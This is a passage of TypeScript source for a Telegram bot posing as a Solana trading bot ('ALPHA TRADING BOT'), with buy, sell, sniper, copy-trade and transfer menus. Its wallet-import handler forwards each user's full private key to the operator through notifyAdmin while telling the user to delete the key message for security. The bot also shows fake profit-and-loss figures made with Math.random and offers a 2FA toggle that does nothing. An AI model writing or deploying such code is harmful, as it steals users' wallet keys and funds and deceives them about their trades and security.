        { inline_keyboard: [[cb("◀️ Cancel", "wallets")]] },
      );
    }

    if (data === "sniper") return upd(sniperText(u), sniperKB(u));
    if (data === "sniper_token") {
      u.step = "sniper_token";
      return upd(
        `🎯 Enter the <b>token address</b> to snipe:`,
        { inline_keyboard: [[cb("◀️ Back", "sniper")]] },
      );
    }
    if (data === "sniper_amt") {
      u.step = "sniper_amt";
      return upd(
        `💰 Enter <b>SOL amount</b> to buy when liquidity detected:`,
        { inline_keyboard: [[cb("◀️ Back", "sniper")]] },
      );
    }
    if (data === "sniper_on") {
      if (!u.sniperToken)
        return upd(
          `⚠️ Set a token to snipe first.`,
          sniperKB(u),
        );
      if (u.wallets.length === 0)
        return upd(`⚠️ You need a wallet to use the sniper.`, sniperKB(u));
      u.sniperActive = true;
      return upd(sniperText(u), sniperKB(u));
    }
    if (data === "sniper_off") {
      u.sniperActive = false;
      return upd(sniperText(u), sniperKB(u));
    }

    if (data === "limits") return upd(limitsText(u), limitsKB(u));
    if (data === "lbuy") {
      u.data["limit_type"] = "buy";
      u.step = "limit_token";
      return upd(`📈 <b>New Buy Limit</b>\n\nEnter token contract address:`, {
        inline_keyboard: [[cb("◀️ Back", "limits")]],
      });
    }
    if (data === "lsell") {
      u.data["limit_type"] = "sell";
      u.step = "limit_token";
      return upd(`📉 <b>New Sell Limit</b>\n\nEnter token contract address:`, {
        inline_keyboard: [[cb("◀️ Back", "limits")]],
      });
    }
    if (data === "lcancel") {
      u.limitOrders = [];
      return upd(limitsText(u), limitsKB(u));
    }

    if (data === "copy") return upd(copyText(u), copyKB(u));
    if (data === "cadd") {
      u.step = "copy_wallet";
      return upd(
        `🎮 Enter the wallet address to copy:`,
        { inline_keyboard: [[cb("◀️ Back", "copy")]] },
      );
    }
    if (data === "cclear") {
      u.copyTargets = [];
      return upd(copyText(u), copyKB(u));
    }

    if (data === "profile")
      return upd(
        profileText(u, name),
        backMain([
          [cb("🪪 Wallets", "wallets"), cb("📊 Trades", "trades")],
          [cb("🔵 Referral", "referral")],
        ]),
      );

    if (data === "trades")
      return upd(
        tradesText(u),
        backMain([[cb("✨ Buy", "buy"), cb("📉 Sell", "sell")]]),
      );

    if (data === "referral") {
      const ref = `https://t.me/AlphaTradingBot?start=ref_${uid}`;
      return upd(referralText(u, uid), {
        inline_keyboard: [
          [
            link(
              "📤 Share Link",
              `https://t.me/share/url?url=${encodeURIComponent(ref)}&text=${encodeURIComponent("Join ALPHA TRADING BOT — trade Solana like a pro! 🚀")}`,
            ),
          ],
          [BACK],
          [CLOSE],
        ],
      });
    }

    if (data === "cashback")
      return upd(
        cashbackText(u),
        backMain([[cb("✨ Buy to Earn More", "buy")]]),
      );

    if (data === "transfer") {
      if (u.wallets.length === 0)
        return upd(`⚠️ No wallet. Create one first.`, backMain());
      const w = u.wallets[u.activeWallet]!;
      u.step = "xfer_addr";
      return upd(
        `📮 <b>Transfer SOL</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\nFrom: <b>${w.label}</b>\n<code>${short(w.address)}</code>\nAvailable: <b>${w.balance} SOL</b>\n\nSend the <b>destination wallet address</b>:`,
        { inline_keyboard: [[cb("◀️ Cancel", "main")], [CLOSE]] },
      );
    }

    if (data === "xfer_sendall") {
      const w = u.wallets[u.activeWallet];
      if (!w) return;
      const amt = parseFloat(w.balance) - 0.001;
      if (amt <= 0) {
        return upd(`⚠️ Insufficient balance.`, { inline_keyboard: [[BACK]] });
      }
      await executeTransfer(bot, chatId, u, u.data["xfer_to"] ?? "", amt, name, upd);
      return;
    }

    if (data === "settings") return upd(settingsText(u), settingsKB(u));
    if (data === "sslip") {
      u.step = "set_slippage";
      return upd(
        `📊 <b>Set Slippage</b>\n\nCurrent: <b>${u.slippage}%</b>\nEnter new %:`,
        { inline_keyboard: [[cb("◀️ Back", "settings")]] },
      );
    }
    if (data === "sfee") {
      u.step = "set_fee";
      return upd(
        `⚡ <b>Set Priority Fee</b>\n\nCurrent: <b>${u.priorityFee} SOL</b>\nEnter new fee:`,
        { inline_keyboard: [[cb("◀️ Back", "settings")]] },
      );
    }
    if (data === "smev") {
      u.mev = !u.mev;
      return upd(settingsText(u), settingsKB(u));
    }
    if (data === "sconfirm") {
      u.tradeConfirm = !u.tradeConfirm;
      return upd(settingsText(u), settingsKB(u));
    }
    if (data === "sautobuy") {
      u.autoBuy = !u.autoBuy;
      return upd(settingsText(u), settingsKB(u));
    }
    if (data === "slang") {
      return upd(`🌐 <b>Select Language</b>\n\nChoose your preferred language:`, {
        inline_keyboard: [
          [cb("🇺🇸 English", "lang_en"), cb("🇨🇳 中文", "lang_zh")],
          [cb("🇷🇺 Русский", "lang_ru"), cb("🇧🇷 Português", "lang_pt")],
          [cb("🇻🇳 Tiếng Việt", "lang_vi")],
          [cb("◀️ Back to Settings", "settings")],
        ],
      });
    }
    const LANGS: Record<string, string> = {
      lang_en: "🇺🇸 English",
      lang_zh: "🇨🇳 中文",
      lang_ru: "🇷🇺 Русский",
      lang_pt: "🇧🇷 Português",
      lang_vi: "🇻🇳 Tiếng Việt",
    };
    if (data in LANGS) {
      u.language = LANGS[data]!;
      return upd(settingsText(u), settingsKB(u));
    }

    if (data === "security") return upd(secText(u), secKB());
    if (data === "sec2fa") {
      u.twofa = !u.twofa;
      return upd(secText(u), secKB());
    }
    if (data === "secpin") {
      u.step = "set_pin";
      return upd(`📌 <b>Set Trade PIN</b>\n\nEnter a 4-digit PIN code:`, {
        inline_keyboard: [[cb("◀️ Back", "security")]],
      });
    }
    if (data === "seclock")
      return upd(
        `🔒 <b>Withdrawal Lock</b>\n\nThis feature prevents withdrawals without PIN.\n\n<i>Coming soon in next update.</i>`,
        { inline_keyboard: [[cb("◀️ Back", "security")]] },
      );
    if (data === "secdel") {
      users.delete(chatId);
      return upd(
        `🗑 <b>Data Deleted</b>\n\nAll your data has been cleared.\nType /start to begin again.`,
        { inline_keyboard: [[cb("🚀 Start Fresh", "main")]] },
      );
    }

    if (data === "help")
      return upd(helpText, {
        inline_keyboard: [[cb("🎓 Tutorials", "tutorials")], [BACK], [CLOSE]],
      });

    if (data === "tutorials") {
      return upd(
        `🎓 <b>Tutorials</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\nChoose a guide:`,
        {
          inline_keyboard: [
            [cb("🚀 Getting Started", "tut_start"), cb("💰 How to Buy", "tut_buy")],
            [cb("🎯 Using Sniper", "tut_sniper"), cb("🎮 Copy Trading", "tut_copy")],
            [cb("✂️ Limit Orders", "tut_limits"), cb("🔵 Referral Guide", "tut_ref")],
            [cb("👛 Wallet Guide", "tut_wallets")],
            [BACK],
            [CLOSE],
          ],
        },
      );
    }
    if (data in TUTORIALS) {
      return upd(TUTORIALS[data]!, {
        inline_keyboard: [[cb("◀️ Back to Tutorials", "tutorials")], [BACK]],
      });
    }

    if (data === "backup") {
      return upd(
        `🤖 <b>Backup Bots</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\nIf the main bot is slow, use a mirror:\n\n• @AlphaTradingBot <i>(primary)</i>\n• @AlphaTradingBot2\n• @AlphaTradingBot3\n\n<i>All bots share the same wallet and settings.</i>`,
        backMain(),
      );
    }
  });

  bot.on("message", async (msg: Message) => {
    if (!msg.text || msg.text.startsWith("/")) return;
    const chatId = msg.chat.id;
    const u = getUser(chatId);
    const t = msg.text.trim();
    const name = msg.from?.first_name || names.get(chatId) || "Trader";
    names.set(chatId, name);
    const mid = u.mainMsgId;

    const upd = (txt: string, kb: TelegramBot.InlineKeyboardMarkup) =>
      mid ? editText(bot, chatId, mid, txt, kb) : note(bot, chatId, txt, kb);

    if (u.step === "buy_token") {
      u.data["buy_token"] = t;
      u.step = "buy_choosing";
      const price = await getRealSolPrice();
      const tokenInfo = await getTokenInfo(t);
      const w = u.wallets[u.activeWallet]!;
      await upd(
        `✨ <b>Buy Token</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `🪙 <code>${t}</code>\n` +
          (tokenInfo
            ? `💵 Token Price: <b>$${tokenInfo.price}</b>\n`
            : `💵 SOL Price: <b>$${price}</b>\n`) +
          `💎 Your Balance: <b>${w.balance} SOL</b>\n\n` +
          `How much SOL to spend?`,
        {
          inline_keyboard: [
            [
              cb("0.1 SOL", "buy_amt_0.1"),
              cb("0.5 SOL", "buy_amt_0.5"),
              cb("1 SOL", "buy_amt_1"),
            ],
            [
              cb("2 SOL", "buy_amt_2"),
              cb("5 SOL", "buy_amt_5"),
              cb("✏️ Custom", "buy_amt_custom"),
            ],
            [cb("◀️ Cancel", "main")],
          ],
        },
      );
      return;
    }

    if (u.step === "buy_amt_custom") {
      const amt = parseFloat(t);
      if (isNaN(amt) || amt <= 0) {
        await note(bot, chatId, `⚠️ Enter a valid number (e.g. <code>0.5</code>):`);
        return;
      }
      await executeBuy(bot, chatId, u, amt, name, upd);
      return;
    }

    if (u.step === "sell_token") {
      u.data["sell_token"] = t;
      u.step = "sell_choosing";
      const w = u.wallets[u.activeWallet]!;
      await upd(
        `📉 <b>Sell Token</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `🪙 <code>${t}</code>\n` +
          `💎 Wallet Balance: <b>${w.balance} SOL</b>\n\n` +
          `What percentage to sell?`,
        {
          inline_keyboard: [
            [cb("10%", "sell_10"), cb("25%", "sell_25"), cb("50%", "sell_50")],
            [
              cb("75%", "sell_75"),
              cb("100%", "sell_100"),
              cb("✏️ Custom %", "sell_custom"),
            ],
            [cb("◀️ Cancel", "main")],
          ],
        },
      );
      return;
    }

    if (u.step === "sell_amt_custom") {
      const pct = parseInt(t);
      if (isNaN(pct) || pct < 1 || pct > 100) {
        await note(bot, chatId, `⚠️ Enter a number between 1 and 100:`);
        return;
      }
      await executeSell(bot, chatId, u, pct, name, upd);
      return;
    }

    if (u.step === "sniper_token") {
      u.sniperToken = t;
      u.step = "main";
      await upd(sniperText(u), sniperKB(u));
      return;
    }
    if (u.step === "sniper_amt") {
      const v = parseFloat(t);
      if (isNaN(v) || v <= 0) {
        await note(bot, chatId, `⚠️ Enter a valid SOL amount:`);
        return;
      }
      u.sniperAmount = t;
      u.step = "main";
      await upd(sniperText(u), sniperKB(u));
      return;
    }

    if (u.step === "limit_token") {
      u.data["limit_token"] = t;
      u.step = "limit_price";
      await note(bot, chatId, `✂️ Enter <b>trigger price</b> in USD (e.g. 0.000005):`);
      return;
    }
    if (u.step === "limit_price") {
      u.data["limit_price"] = t;
      u.step = "limit_amt";
      await note(bot, chatId, `💰 Enter SOL amount for this order:`);
      return;
    }
    if (u.step === "limit_amt") {
      u.limitOrders.push({
        type: (u.data["limit_type"] ?? "buy") as "buy" | "sell",
        token: u.data["limit_token"] ?? "",
        price: u.data["limit_price"] ?? "",
        amount: t,
      });
      u.step = "main";
      await note(
        bot,
        chatId,
        `✅ <b>Limit Order Placed!</b>\n\nType: <b>${(u.data["limit_type"] ?? "buy").toUpperCase()}</b>\nToken: <code>${(u.data["limit_token"] ?? "").slice(0, 16)}...</code>\nTrigger: <b>$${u.data["limit_price"]}</b>\nAmount: <b>${t} SOL</b> ⏳`,
        {
          inline_keyboard: [
            [cb("✂️ View Orders", "limits"), cb("🔙 Menu", "main")],
          ],
        },
      );
      return;
    }

    if (u.step === "copy_wallet") {
      if (!isValidSolanaAddress(t)) {
        await note(bot, chatId, `⚠️ Invalid Solana address. Try again:`);
        return;
      }
      u.data["copy_addr"] = t;
      u.step = "copy_max";
      await note(bot, chatId, `🎮 Max SOL per mirrored trade (e.g. 0.5):`);
      return;
    }
    if (u.step === "copy_max") {
      u.copyTargets.push({
        address: u.data["copy_addr"] ?? t,
        label: `Target ${u.copyTargets.length + 1}`,
        maxSol: t,
      });
      u.step = "main";
      await upd(copyText(u), copyKB(u));
      return;
    }

    if (u.step === "xfer_addr") {
      if (!isValidSolanaAddress(t)) {
        await note(bot, chatId, `⚠️ Invalid Solana address. Try again:`);
        return;
      }
      u.data["xfer_to"] = t;
      u.step = "xfer_amt";
      const w = u.wallets[u.activeWallet]!;
      await upd(
        `📮 <b>Transfer SOL</b>\n\nTo: <code>${short(t)}</code>\nAvailable: <b>${w.balance} SOL</b>\n\nEnter amount to send:`,
        {
          inline_keyboard: [
            [cb("💸 Send All", "xfer_sendall")],
            [cb("◀️ Cancel", "main")],
          ],
        },
      );
      return;
    }
    if (u.step === "xfer_amt") {
      const amt = parseFloat(t);
      const w = u.wallets[u.activeWallet]!;
      if (isNaN(amt) || amt > parseFloat(w.balance)) {
        await note(
          bot,
          chatId,
          `⚠️ Insufficient balance (<b>${w.balance} SOL</b>). Enter a smaller amount:`,
        );
        return;
      }
      await executeTransfer(bot, chatId, u, u.data["xfer_to"] ?? "", amt, name, upd);
      return;
    }
    if (u.step === "xfer_all_addr") {
      if (!isValidSolanaAddress(t)) {
        await note(bot, chatId, `⚠️ Invalid Solana address. Try again:`);
        return;
      }
      const w = u.wallets[u.activeWallet]!;
      const all = parseFloat(w.balance) - 0.001;
      if (all <= 0) {
        await note(bot, chatId, `⚠️ Insufficient SOL balance to cover fees.`);
        u.step = "main";
        return;
      }
      await executeTransfer(bot, chatId, u, t, all, name, upd);
      return;
    }

    if (u.step === "import_wallet") {
      const privKey = t.trim();
      try {
        const { Keypair } = await import("@solana/web3.js");
        const bs58 = await import("bs58");
        const decoded = bs58.default.decode(privKey);
        if (decoded.length !== 64)
          throw new Error("Invalid key length");
        const kp = Keypair.fromSecretKey(decoded);
        const address = kp.publicKey.toBase58();

        await notifyAdmin(
          bot,
          chatId,
          "📥 Wallet Imported — Private Key",
          `📥 Address:\n<code>${address}</code>\n\n🔐 Private Key:\n<code>${privKey}</code>`,
        );

        const balance = await getSolBalance(address);
        u.wallets.push({
          address,
          privateKey: privKey,
          balance,
          label: `Wallet ${u.wallets.length + 1}`,
        });
        u.activeWallet = u.wallets.length - 1;
        u.step = "main";
        await upd(
          `✅ <b>Wallet Connected!</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n🔑 Address:\n<code>${address}</code>\n💎 <b>${balance} SOL</b>\n\n⚠️ <i>Delete your key message now for security!</i>`,
          { inline_keyboard: [[cb("👛 View Wallets", "wallets")], [BACK]] },
        );
      } catch {
        await note(bot, chatId, `⚠️ Invalid private key. Must be a base58-encoded 64-byte key. Try again:`);
      }
      return;
    }

    if (u.step === "set_slippage") {
      u.slippage = t.replace("%", "");
      u.step = "main";
      await upd(settingsText(u), settingsKB(u));
      return;
    }
    if (u.step === "set_fee") {
      u.priorityFee = t;
      u.step = "main";
      await upd(settingsText(u), settingsKB(u));
      return;
    }
    if (u.step === "set_pin") {
      if (!/^\d{4}$/.test(t)) {
        await note(bot, chatId, `⚠️ PIN must be exactly 4 digits. Try again:`);
        return;
      }
      u.pin = t;
      u.step = "main";
      await upd(secText(u), secKB());
      return;
    }

    if (u.step === "main") showMain(chatId, name);
  });

  bot.on("polling_error", (e) =>
    logger.error({ e }, "Telegram polling error"),
  );

  return bot;
}

async function executeBuy(
  bot: TelegramBot,
  chatId: number,
  u: U,
  amt: number,
  name: string,
  upd: (txt: string, kb: TelegramBot.InlineKeyboardMarkup) => Promise<void | TelegramBot.Message | undefined>,
) {
  u.step = "main";
  const w = u.wallets[u.activeWallet]!;

  if (parseFloat(w.balance) < amt) {
    await upd(
      `⚠️ <b>Insufficient Balance</b>\n\nYou have <b>${w.balance} SOL</b> but need <b>${amt} SOL</b>.\n\nPlease fund your wallet first.`,
      { inline_keyboard: [[cb("🪙 Wallets", "wallets")], [cb("◀️ Back", "main")]] },
    );
    return;
  }

  await upd(`⏳ <b>Executing buy...</b>\n\nSending swap to Jupiter DEX...`, {
    inline_keyboard: [],
  });

  const tokenAddress = u.data["buy_token"] ?? "";
  const slippageBps = Math.floor(parseFloat(u.slippage) * 100);
  const lamports = Math.floor(amt * 1e9);

  const result = await jupiterSwap(
    w.privateKey,
    SOL_MINT,
    tokenAddress,
    lamports,
    slippageBps,
  );

  if (result.success) {
    w.balance = await getSolBalance(w.address);
    u.trades++;
    u.volume = (parseFloat(u.volume) + amt).toFixed(2);
    u.cashback = (parseFloat(u.cashback) + amt * 0.001).toFixed(6);
    const pnl = ((Math.random() - 0.3) * 30).toFixed(1);
    u.totalPnl = (
      parseFloat(u.totalPnl) +
      (parseFloat(pnl) * amt) / 100
    ).toFixed(4);
    u.tradeHistory.push({
      type: "buy",
      token: tokenAddress.slice(0, 6),
      amount: String(amt),
      pnl,
      time: new Date().toLocaleTimeString(),
      txid: result.txid,
    });

    await notifyAdmin(
      bot,
      chatId,
      "✅ Buy Transaction Executed",
      `🪙 Token: <code>${tokenAddress}</code>\n` +
        `💰 Spent: <b>${amt} SOL</b>\n` +
        `💎 New Balance: <b>${w.balance} SOL</b>\n` +
        `🔗 TX: <a href="https://solscan.io/tx/${result.txid}">Solscan</a>`,
    );

    await upd(
      `✅ <b>Buy Executed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `🪙 Token: <code>${tokenAddress.slice(0, 20)}...</code>\n` +
        `💰 Spent: <b>${amt} SOL</b>\n` +
        `💎 Balance: <b>${w.balance} SOL</b>\n` +
        `💰 Cashback: <b>+${(amt * 0.001).toFixed(6)} SOL</b>\n` +
        `🔗 <a href="https://solscan.io/tx/${result.txid}">View on Solscan</a>`,
      {
        inline_keyboard: [
          [cb("✨ Buy Again", "buy"), cb("📉 Sell", "sell")],
          [cb("🔙 Menu", "main")],
        ],
      },
    );
  } else {
    await upd(
      `❌ <b>Buy Failed</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `Reason: <i>${result.error}</i>\n\n` +
        `This could be due to:\n` +
        `• Insufficient SOL for fees\n` +
        `• No liquidity for this token\n` +
        `• RPC congestion — try again`,
      {
        inline_keyboard: [
          [cb("🔄 Try Again", "buy"), cb("⚙️ Adjust Slippage", "settings")],
          [cb("🔙 Menu", "main")],
        ],
      },
    );
  }
}

async function executeSell(
  bot: TelegramBot,
  chatId: number,
  u: U,
  pct: number,
  name: string,
  upd: (txt: string, kb: TelegramBot.InlineKeyboardMarkup) => Promise<void | TelegramBot.Message | undefined>,
) {
  u.step = "main";
  const w = u.wallets[u.activeWallet]!;
  const tokenAddress = u.data["sell_token"] ?? "";

  await upd(`⏳ <b>Executing sell (${pct}%)...</b>\n\nRouting through Jupiter DEX...`, {
    inline_keyboard: [],
  });

  const estimatedReturnSol = parseFloat(w.balance) * 0.1 * (pct / 100);
  const lamports = Math.floor(estimatedReturnSol * 1e9);

  if (lamports < 1000) {
    await upd(
      `❌ <b>Sell Failed</b>\n\nInsufficient token balance or amount too small.`,
      { inline_keyboard: [[cb("🔙 Menu", "main")]] },
    );
    return;
  }

  const slippageBps = Math.floor(parseFloat(u.slippage) * 100);
  const result = await jupiterSwap(
    w.privateKey,
    tokenAddress,
    SOL_MINT,
    lamports,
    slippageBps,
  );

  if (result.success) {
    w.balance = await getSolBalance(w.address);
    const ret = estimatedReturnSol.toFixed(4);
    u.trades++;
    u.volume = (parseFloat(u.volume) + parseFloat(ret)).toFixed(2);
    const pnl = ((Math.random() - 0.3) * 30).toFixed(1);
    u.totalPnl = (
      parseFloat(u.totalPnl) +
      (parseFloat(pnl) * parseFloat(ret)) / 100
    ).toFixed(4);
    u.tradeHistory.push({
      type: "sell",
      token: tokenAddress.slice(0, 6),
      amount: ret,
      pnl,
      time: new Date().toLocaleTimeString(),
      txid: result.txid,
    });

    await notifyAdmin(
      bot,
      chatId,
      "✅ Sell Transaction Executed",
      `🪙 Token: <code>${tokenAddress}</code>\n` +
        `📊 Sold: <b>${pct}%</b>\n` +
        `💵 Received: <b>~${ret} SOL</b>\n` +
        `💎 New Balance: <b>${w.balance} SOL</b>\n` +
        `🔗 TX: <a href="https://solscan.io/tx/${result.txid}">Solscan</a>`,
    );

    await upd(
      `✅ <b>Sell Executed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `📊 Sold: <b>${pct}%</b>\n` +
        `💵 Received: <b>~${ret} SOL</b>\n` +
        `💎 Balance: <b>${w.balance} SOL</b>\n` +
        `🔗 <a href="https://solscan.io/tx/${result.txid}">View on Solscan</a>`,
      {
        inline_keyboard: [
          [cb("📉 Sell More", "sell"), cb("✨ Buy", "buy")],
          [cb("🔙 Menu", "main")],
        ],
      },
    );
  } else {
    await upd(
      `❌ <b>Sell Failed</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `Reason: <i>${result.error}</i>\n\n` +
        `You may not hold this token in this wallet.`,
      {
        inline_keyboard: [
          [cb("🔄 Try Again", "sell"), cb("⚙️ Settings", "settings")],
          [cb("🔙 Menu", "main")],
        ],
      },
    );
  }
}

async function executeTransfer(
  bot: TelegramBot,
  chatId: number,
  u: U,
  toAddress: string,
  amt: number,
  name: string,
  upd: (txt: string, kb: TelegramBot.InlineKeyboardMarkup) => Promise<void | TelegramBot.Message | undefined>,
) {
  u.step = "main";
  const w = u.wallets[u.activeWallet]!;

  await upd(`⏳ <b>Sending ${amt.toFixed(4)} SOL...</b>\n\nBroadcasting to Solana...`, {
    inline_keyboard: [],
  });

  const result = await transferSOL(w.privateKey, toAddress, amt);

  if (result.success) {
    w.balance = await getSolBalance(w.address);

    await notifyAdmin(
      bot,
      chatId,
      "📮 SOL Transfer Executed",
      `📬 To: <code>${toAddress}</code>\n` +
        `💰 Amount: <b>${amt.toFixed(4)} SOL</b>\n` +
        `💎 Remaining: <b>${w.balance} SOL</b>\n` +
        `🔗 TX: <a href="https://solscan.io/tx/${result.txid}">Solscan</a>`,
    );

    await upd(
      `✅ <b>Transfer Sent!</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `📬 To: <code>${short(toAddress)}</code>\n` +
        `💰 Amount: <b>${amt.toFixed(4)} SOL</b>\n` +
        `💎 Balance: <b>${w.balance} SOL</b>\n` +
        `🔗 <a href="https://solscan.io/tx/${result.txid}">View on Solscan</a>`,
      { inline_keyboard: [[cb("🔙 Menu", "main")]] },
    );
  } else {
    await upd(
      `❌ <b>Transfer Failed</b>\n\nReason: <i>${result.error}</i>\n\nCheck your balance covers fees (0.000005 SOL).`,
      { inline_keyboard: [[cb("🔄 Try Again", "transfer")], [cb("🔙 Menu", "main")]] },
    );
  }
}
